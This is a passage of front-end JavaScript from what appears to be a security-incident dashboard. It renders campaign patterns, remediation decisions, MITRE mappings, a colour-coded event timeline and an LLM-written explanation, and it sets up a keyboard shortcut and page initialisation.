    // Campaign pattern — show detection or fallback
    const amCampaign = document.getElementById('am-campaign');
    if (amCampaign) {
      const pattern = data.campaign_pattern || null;
      console.log('[Agent] Campaign pattern value:', pattern, typeof pattern);
      if (pattern && pattern !== 'None' && pattern !== '') {
        const label = pattern.replace(/_/g, ' ').toUpperCase();
        const badgeClass = sev === 'CRITICAL' ? 'cb-critical' : sev === 'HIGH' ? 'cb-high' : '';
        amCampaign.innerHTML = `<span class="campaign-badge ${badgeClass}">${esc(label)}</span>`;
        amCampaign.style.color = '';
      } else {
        amCampaign.textContent = 'No pattern';
        amCampaign.style.color = 'var(--text-2)';
      }
    }

    // Incident type
    const amIncident = document.getElementById('am-incident');
    if (amIncident) {
      const itype = (data.incident_type || 'single_session').replace(/_/g, ' ');
      const displayType = itype.charAt(0).toUpperCase() + itype.slice(1);
      amIncident.textContent = displayType;
      amIncident.style.color = itype.includes('single') ? 'var(--text-2)' : 'var(--green)';
    }

    // Decision with better styling
    const amDecision = document.getElementById('am-decision');
    if (amDecision) {
      const decision = data.decision || 'MONITOR';
      amDecision.textContent = decision.replace(/_/g, ' ');
      const decisionColors = {
        'AUTO_REMEDIATE': 'var(--red)',
        'ESCALATE_L2': 'var(--amber)',
        'MONITOR': 'var(--blue)'
      };
      const color = decisionColors[decision] || 'var(--text-1)';
      amDecision.style.color = color;
      amDecision.style.fontWeight = '700';
      amDecision.title = `Decision: ${decision} (Confidence: ${((data.confidence ?? 0) * 100).toFixed(0)}%)`;
    }

    // Why Flagged
    const whyFlaggedRow = document.getElementById('agent-why-flagged-row');
    const whyFlaggedEl = document.getElementById('am-why-flagged');
    if (whyFlaggedRow && whyFlaggedEl) {
      const whyFlagged = data.why_flagged || [];
      if (whyFlagged.length > 0) {
        whyFlaggedRow.style.display = '';
        whyFlaggedEl.innerHTML = whyFlagged.map(reason => 
          `<div class="why-flagged-item">• ${esc(reason)}</div>`
        ).join('');
      } else {
        whyFlaggedRow.style.display = 'none';
      }
    }

    // Detection improvement
    const improvEl = document.getElementById('agent-improvement');
    const improvVal = document.getElementById('am-improvement');
    if (improvEl && improvVal) {
      if (data.detection_improvement && data.detection_improvement !== 'No improvement from compound analysis.') {
        improvEl.style.display = '';
        improvVal.textContent = data.detection_improvement;
        improvVal.style.color = 'var(--green)';
      } else {
        improvEl.style.display = 'none';
      }
    }

    // Entities
    const amEntities = document.getElementById('am-entities');
    if (amEntities) {
      const entities = data.entities || [];
      amEntities.innerHTML = entities.map(e =>
        `<span class="graph-node">${esc(e)}</span>`
      ).join(' ');
    }
  }

  // ── Compound MITRE mappings ──
  const compoundMitreSection = document.getElementById('r-compound-mitre-section');
  const compoundMitreEl = document.getElementById('r-compound-mitre');
  if (compoundMitreSection && compoundMitreEl) {
    const compoundMitre = data.compound_mitre_mappings || [];
    const individualMitre = data.mitre_mappings || [];
    if (compoundMitre.length > 0) {
      compoundMitreSection.classList.remove('hidden');
      compoundMitreEl.innerHTML = compoundMitre.map(t => {
        const isNew = !individualMitre.includes(t);
        const cls = isNew ? 'mitre-tag-new' : 'mitre-tag-compound';
        return `<span class="${cls}">${esc(t)}</span>`;
      }).join('');
    } else {
      compoundMitreSection.classList.add('hidden');
    }
  }

  // ── Correlated Timeline ──
  const timelineSection = document.getElementById('r-timeline-section');
  const timelineEl = document.getElementById('r-timeline');
  if (timelineSection && timelineEl) {
    const timeline = data.correlated_timeline || [];
    if (timeline.length > 0) {
      timelineSection.classList.remove('hidden');
      const HIGH_TYPES = new Set(['PRIV_ESC', 'SUSPICIOUS_EXEC', 'LATERAL_MOVE', 'DEFENSE_EVADE', 'EXFILTRATION']);
      const MED_TYPES = new Set(['LOGIN', 'OUTBOUND_CONN', 'RECON']);

      timelineEl.innerHTML = '<div class="timeline-list">' + timeline.slice(0, 20).map(entry => {
        const etype = entry.event_type || 'UNKNOWN';
        const dotClass = HIGH_TYPES.has(etype) ? 'td-high' : MED_TYPES.has(etype) ? 'td-medium' : 'td-low';
        const typeColor = HIGH_TYPES.has(etype) ? 'var(--red)' : MED_TYPES.has(etype) ? 'var(--amber)' : 'var(--green)';
        return `<div class="timeline-entry">
          <span class="timeline-dot ${dotClass}"></span>
          <div class="timeline-content">
            <span class="timeline-ts">${esc(entry.timestamp || 'N/A')}</span>
            <span class="timeline-type" style="color:${typeColor}">${esc(etype)}</span>
            <span class="timeline-desc">${esc(entry.description || '')}</span>
            <span class="timeline-session">session: ${esc(entry.session_id || '?')}</span>
          </div>
        </div>`;
      }).join('') + '</div>';
    } else {
      timelineSection.classList.add('hidden');
    }
  }

  // ── Agent explanation ──
  const agentExplSection = document.getElementById('r-agent-explanation-section');
  const agentExplEl = document.getElementById('r-agent-explanation');
  if (agentExplSection && agentExplEl) {
    if (data.llm_explanation) {
      agentExplSection.classList.remove('hidden');
      agentExplEl.innerHTML = `<div class="explanation-text">${formatText(data.llm_explanation)}</div>`;
    } else {
      agentExplSection.classList.add('hidden');
    }
  }

  // Update raw output
  rawReport = JSON.stringify(data, null, 2);
  document.getElementById('raw-body').textContent = rawReport;
}

/* ─── Keyboard shortcut (Enter to run) ──────────────────────── */
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
    e.preventDefault();
    if (!runBtn.disabled) investigate();
  }
});

/* ─── Init ────────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  updateCounts();
  initAPI();
  silentLogin();
  feedEntry('LSTM model: loaded', 'feed-ok');
  feedEntry('Agent layer: active', 'feed-found');
  feedEntry('Ready — paste logs or select scenario', 'feed-sys');
});
